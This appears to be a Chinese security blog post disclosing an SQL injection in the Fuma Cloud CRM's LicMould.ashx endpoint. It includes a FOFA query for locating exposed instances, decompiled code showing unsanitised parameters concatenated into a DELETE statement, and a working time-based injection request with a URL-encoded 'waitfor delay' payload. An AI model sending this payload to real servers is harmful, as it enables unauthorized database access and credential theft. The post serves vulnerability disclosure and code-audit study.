---
title: "孚盟云CRM LicMould.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-LicMould-sqli.html
asset_dir: assets/孚盟云crm-licmould.ashx-sql注入漏洞
---

# 孚盟云CRM LicMould.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/3 11:37
- 662浏览
- [0评论](#comment)
- 11分钟阅读

深入探索

身份验证

应用程序

SQL

---

# 漏洞简介

上海孚盟[软件](#)有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云LicMould.ashx接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

客户关系管理

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 LicMould.ashx 对应的dll文件 FumaCRM\_BS.NewWeb.dll 里有关 LicMould 方法的实现如下

```
public void ProcessRequest(HttpContext context)
{
  context.Response.ContentType = "text/plain";
  string str1 = context.Request["action"];
  if (!string.op_Equality(str1, "DeleteEmp"))
  {
  if (!string.op_Equality(str1, "TreeLoad"))
  {
    if (!string.op_Equality(str1, "Details"))
    {
    ...
```

深入探索

文件大小转换

企业安全咨询

漏洞修复方案

当 **action=DeleteEmp** 时，处理逻辑如下

SQL注入检测工具

```
string str7 = context.Request["fuids"];
    string SQLString = $"delete from syLicMouldEmp where MouldKey={context.Request["key"]} and FUID in({$"'{str7.Substring(0, str7.Length - 1).Replace(",", "','")}'"})";
```

未经过滤或参数化绑定的参数 **key** 和 **fuids** 被直接拼接进SQL语句中进行执行，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

其他当 **action=Details**时，也存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

[![孚盟云CRM LicMould.ashx SQL注入漏洞](images/img-001-5a98ba3eec8c.webp)](https://image.mrxn.net/4b2410721dfa4f7dbf1fe1b4886bb8af.webp)

[![孚盟云CRM LicMould.ashx SQL注入漏洞](images/img-002-d135368d44ad.webp)](https://image.mrxn.net/87e82a96afa84759a6a84822c9ca51af.webp)

整体执行逻辑如下

代码安全审计

[![孚盟云CRM LicMould.ashx SQL注入漏洞](images/img-003-dbfc4719caec.webp)](https://image.mrxn.net/3620f4118630499e9328a83216737401.webp)

# 漏洞复现

```
POST /Ajax/LicMould.ashx HTTP/1.1
Host: fumacrm.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=DeleteEmp&key=%31%20%77%61%69%74%66%6f%72%20%44%45%6c%61%59%27%30%3a%30%3a%34%27%2d%2d&fuids=1
```

[![孚盟云CRM LicMould.ashx SQL注入漏洞](images/img-004-d445ec6eb020.webp)](https://image.mrxn.net/2d014c7939fb43beb1a94d75d2a43d00.webp)

成功延时 4 秒

漏洞预警服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKNUlEQVR4AeycgXobNwyD8/f933kzzUGCJZ58Tpuzt6lfWPAAkFJEy27affv19fX11+/GXyd++RqV3fUz+Z/oUa2jvistPNIjj9Dz72IM5NZjf33KCbSB3Kb89UpU3wDwBTxIwJ3z3jJAakBbW1qFf6LHs76Qe3Kf1oXUAJenXP6z6A3aQJzc+ftOYBoIcH9FQ42rreoVAb32jD/qKl/wEdKg94XMQ1fAzKlWKG+gOMg6QFS7se6LXNGMiwR4+SyngSz6b+mCE9gDueCQX1niRwaiax2ozcD6+kLqUaNQrVC8o7RnqBr3iXOUDrkf6CjtJ/FHBvKTG/6v9/7xgejV5wdZcdJhfkVWfug+yFw9KoT0QEf5YOakHWG1pyPvK/zPDOSVHWzvwwnsgTwcx/sfpoHoKh7hasvQrz485lXd0Rri4biHPN634qRLc4Ts79wqh/RDR/WvcNUrtKpmGkhl2tx1J9AGAn3q8DxfbTGmr5BPz4GQ/aUFwswFHxE1EZAeIOjDANpPyFEXAckdFv0jwOyD5KKP4h97CZB+OIfepA3EyZ2/7wT2QN539uXKv3QFfwfLzgMJ/fpKgtc43yNkrXoFQnLuCz5CHKQHCPowgPa2JxPMnDT1/13cN0Qn+iF4aiDQXxlwnOvVAd2j71Pad1A9YO4r7Qgha6RX60sLlB65ouKkCSHXgY7SjhDS6/qpgXjBG/P/xdJtIDBPC5LTKyRQpxL5GJB+eQLlgdSAoKcA7u/Zk3Aj1KPCmzx9QfaCc/80DN0PmftaWsA55dIqhOwFHZ/52kAq4+auP4E9kOvPfLniL8jrpCsI+Qzr6w7dpxXUw7HSIGulOUJqgNOHua+lvDID97dEmPGs332QfcRp7Wcof6C8kSv2DdFJfAi2Hwyr/UC+CqCjpuoIXQeqVg+vThmAxotzhK7DYy4fdF5ctbdKc9+Yy+8I81qQnPuUQ2rQUVogJB+5Yt8QncSH4B7IhwxC22gf6jBfH11jmR0h/dA//Cs/pE/aK+jrRe618TwG5FrOq8a5MYesA0bp/qweFd4Nt9+A9vYLma/8t5L2H+NFrtg3RCfxIdg+1DXNs/uSPxDyFQGJVQ9IDWqsasTFGhEw1wavkB+6T9wKVR8IWet+SA5mjJoxVAvdv+K8ft8QndSH4B7IhwxC21h+qMvkCP0aQubSdfUgeUBS+wALj8jIFeIcV5r7xlx1gaP2O8/RT6E+wOGHuTyOqg8UD73HviE6lQ/B9qGu/cTkFJCTk+YojyOk3znlVa1zkLVwjOrl6D3EQ+/heuTQNcg8eIV66PkI5asQsq9rR31Gft+Q8UTe/LwH8uYBjMu3D3VdL8jrBjSvtECRQPswExd6hJ4dofshc9ej7lm4/9Vcvas6yP0Aldz+QAK07xkyLwsKEmY/zNy+IcXh/QHq2y3aQGCe1qqrXnGB8FgL+Qwdw6dQX+j6WQ6yRn5HSE3rBEqHWQs9Qp5AmH3BR4R3DEg/dAxvBHROdcGvog1kZdradSfQ/ti7miD0SWtrcMypl6PqHF2H7LfivLbKVQvZCzrKDzMnzRHO+bSm1yqXFijOMfgI5/YN8dP4gHwP5AOG4Fs4NZC4VgoV6zlw5PTsCOfeAmD2QXKxlgKSg46+nnL5x+fgxTkGH+Ec5BorLmoU7lMOcw9pjqcG4gU7/9kTaD8YahlNOVCcY/ARkBOH/k+40Dl4zKNGoX7QPeLkcZQG3e+6ckhdfkd5nKtyyB7yB1Y+cZB+PQdGTQSkBgQ9BXD/QTO8in1DpmN6L7EH8t7zn1ZvA4G8Pu7QNXJOubTAigs+Qhpkf+hvcdIcofsg8+gzhmogPdD7uhe6DqjsJVQ/Lxo54P72A7it5fIDzVdxbSCtcidvPYFpINAnWO0Mug51XtU5B1nnnF4tzn03h+wP/dac7XV2H5BryO8Is6b13SfOcRqIizu//gT2QK4/8+WK7S8XKxfk1XPNr9xRDlkH/S3DvernHGSNtEDpkUdAeoB4vIc8gcD9A/MuDL+FHgHpAZojeAVw7wEdZYSZk+Z4plf4IftFrtg3RCfxIdgGoqk+2xfkVOEYvQfMPtfHXPsIfEULb9SMEbyH65B7q3TnlHutOJh7SHuG3k95G8iz4q1fcwLt77JgnrSm5lsRV6F8leacfI7SIfcBNBl46X0dZj8k15rektWaN/mlL8j+0NEbrNaCXvOGG+Lb3Pl4Ansg44m8+bkNRFfKsdob9OsFmcunWkgekPTwliNfE28JcPfc0pe+1CsQ5h7Be0B6oKMvCMk/41wfc6038vEsLTCex2gDGYX9/J4TWA4E5ldLTHaMceuuQ/aoOEgN+g+QYy9/9h7iofcQV/mkObpvzN2nHI7XkicQ0uc9IbnQFZCc+5YDUeHG605gD+S6sz610jQQyGsEtAbA/QMXzmErvCW6jre0fYlzbOIigXl9t6ufc2MuTyDM/SA5rwvvGK5H7no8jyF95OMZck3gaxrI1/711hNoA4GckiYZuNpZ6IqVD7Jv5YHUgCarZyBwv5lNtCT0CKPuXsgaqNH9yqPPKmDuJT+kpl6OkBrgdMvVoxG3pA3klv+rv/4rm98D+bBJtn+g0vUB2tXXXqUFioNjnzyOMPuPdEhvrBfhvjEPfQz3jBpkb6DZgOl7buItUY9b+u0v6GvAY+5N9w3x0/iAfBqIXg2O0CeqPbuuHNInT6A0x+DHcF35yiMNck3oKM0RUneuyiF9MKP7IXXnzuT63hy9bhqIizu//gT2QK4/8+WK078YQl5FoCzUVQPaByFkLq0sNBLSb1Tr5Zzyqi9kD2mB8jtC+pwb86gdwz2jFs+uRw65DhCPpwK4f99u3jfET+MD8umPvTF9hfan58CKCz4CcuKwxvBGqNcRQvaRDvkM/a/roXPyvYrQe0DmVQ9IDWhyfB9H0UwHiepc3jfET2PKryeWnyHA/T0O1jhuW5M/wtEfz/JGfhTyBELuKXKF6vQcWHHBe8gT6LxyyLVCPwpID3BkOcXvG3LqmK4z7YFcd9anVmoD0fU8i6vuwLfe6lY9R037hL6WOPeOHHQ/ZO5+mLmxh/uVyxMo7hlCrhU1ijaQZ8Vbv+YEpoFATg1qPLMtTfsI1cN1cdDXrTjoOiDLAwKHN9TXXOUPDRcPcLzWouxBgt5jGsiDcz9cfgJ7IJcf+XrBPzoQvQVAv4Lr5deq+gndLc4Rct3KJw7SA4g6fHsDHjRfS8XOKT+jyTPiHx3I2Hw/1yewYi8bCPRX22pDepUFrnxnNch15Y++CnGOlSYOshfMf5f2rAdkrfuq/LKBVItvbj6BPZD5TN7KTAPR9TzC7+626gd5jYFlW+D+4eomSA46Sve1xAmh+yFzaYEwc8FHeF849sGxFn1WMQ1kZd7az59AGwjkVOEcrrbmryT5oPcV5z5IXdpZ9B7KvXbk9PwMvYdyyD0Cosr/67VE4H6zAVEl+l7aQErnJi8/gT2Qy498veDfAAAA///VjPSZAAAABklEQVQDAPKomobCE/0fAAAAAElFTkSuQmCC)

手机扫码阅读
